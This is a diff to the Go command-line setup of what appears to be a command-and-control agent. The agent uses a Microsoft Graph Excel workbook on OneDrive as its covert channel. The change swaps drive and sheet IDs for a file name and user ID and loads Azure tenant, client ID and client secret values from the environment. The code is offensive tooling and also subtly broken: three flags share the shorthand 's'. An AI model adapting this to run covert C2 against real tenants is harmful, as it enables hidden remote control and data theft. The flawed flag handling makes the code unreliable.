@@ -11,12 +11,12 @@ import (
 
 var (
 	// TO HARDCODE, set the values here, eg...
-	// tenantID string = "blahblahblah....I'm_a_tenant_id...."
+	// tenantId string = "blahblahblah....I'm_a_tenant_id...."
 	tenantId      string
 	clientId      string
 	clientSecret  string
-	driveId       string
-	sheetId       string
+	fileName      string
+	userId        string
 	debug_default bool = false
 )
 
@@ -32,14 +32,20 @@ var rootCmd = &cobra.Command{
 		c2.TenantId = tenantId
 		c2.ClientId = clientId
 		c2.ClientSecret = clientSecret
-		c2.DriveId = driveId
-		c2.SheetId = sheetId
+		c2.FileName = fileName
+		c2.UserId = userId
 
 		//HTTP Fields
 		c2.UserAgent = "GoLang Client"
 		c2.HttpClient = new(http.Client)
-		c2.BaseURL = "https://graph.microsoft.com/v1.0/drives/" + c2.DriveId + "/items/" + c2.SheetId + "/workbook/worksheets"
+		c2.BaseURL = "https://graph.microsoft.com/v1.0/users/" + c2.UserId + "/drive/root:/" + c2.FileName
 		c2.Debug = debug_default
+
+		// Find the drive/sheet IDs
+		C2.UpdateSheetMeta(c2)
+
+		// Update the BaseURL with drive/sheet IDs
+		c2.BaseURL = "https://graph.microsoft.com/v1.0/drives/" + c2.DriveId + "/items/" + c2.SheetId + "/workbook/worksheets"
 
 		//Start
 		C2.Run(c2)
@@ -48,33 +54,51 @@ var rootCmd = &cobra.Command{
 
 func init() {
 	if tenantId == "" {
-		rootCmd.Flags().StringVarP(&tenantId, "tenant", "t", os.Getenv("TENANT_ID"), "Azure tenant ID")
-		rootCmd.MarkFlagRequired("tenant")
+		if os.Getenv("TENANT_ID") != "" {
+			tenantId = os.Getenv("TENANT_ID")
+		} else {
+			rootCmd.Flags().StringVarP(&tenantId, "tenant", "t", os.Getenv("TENANT_ID"), "Azure tenant ID")
+			rootCmd.MarkFlagRequired("tenant")
+		}
 	}
 
 	if clientId == "" {
-		rootCmd.Flags().StringVarP(&clientId, "client", "c", os.Getenv("CLIET_ID"), "Azure client ID")
-		rootCmd.MarkFlagRequired("client")
+		if os.Getenv("CLIENT_ID") != "" {
+			clientId = os.Getenv("CLIENT_ID")
+		} else {
+			rootCmd.Flags().StringVarP(&clientId, "client", "c", os.Getenv("CLIENT_ID"), "Azure client ID")
+			rootCmd.MarkFlagRequired("client")
+		}
 	}
 
 	if clientSecret == "" {
-		rootCmd.Flags().StringVarP(&clientSecret, "secret", "s", os.Getenv("CLIENT_SECRET"), "Azure client secret")
-		rootCmd.MarkFlagRequired("secret")
-
+		if os.Getenv("CLIENT_SECRET") != "" {
+			clientSecret = os.Getenv("CLIENT_SECRET")
+		} else {
+			rootCmd.Flags().StringVarP(&clientSecret, "secret", "s", os.Getenv("CLIENT_SECRET"), "Azure client secret")
+			rootCmd.MarkFlagRequired("secret")
+		}
 	}
 
-	if driveId == "" {
-		rootCmd.Flags().StringVarP(&driveId, "drive", "d", os.Getenv("DRIVE_ID"), "Azure drive ID")
-		rootCmd.MarkFlagRequired("drive")
+	if fileName == "" {
+		if os.Getenv("FILE_NAME") != "" {
+			fileName = os.Getenv("FILE_NAME")
+		} else {
+			rootCmd.Flags().StringVarP(&fileName, "file", "s", os.Getenv("FILE_NAME"), "Excel file name")
+			rootCmd.MarkFlagRequired("file")
+		}
 	}
 
-	if sheetId == "" {
-		rootCmd.Flags().StringVarP(&sheetId, "sheet", "e", os.Getenv("SHEET_ID"), "Azure sheet ID")
-		rootCmd.MarkFlagRequired("sheet")
+	if userId == "" {
+		if os.Getenv("USER_ID") != "" {
+			userId = os.Getenv("USER_ID")
+		} else {
+			rootCmd.Flags().StringVarP(&userId, "user", "s", os.Getenv("USER_ID"), "Azure user ID")
+			rootCmd.MarkFlagRequired("user")
+		}
 	}
 
 	rootCmd.Flags().BoolVarP(&debug_default, "verbos", "v", debug_default, "Enable verbos output")
-
 }
 
 func Execute() {
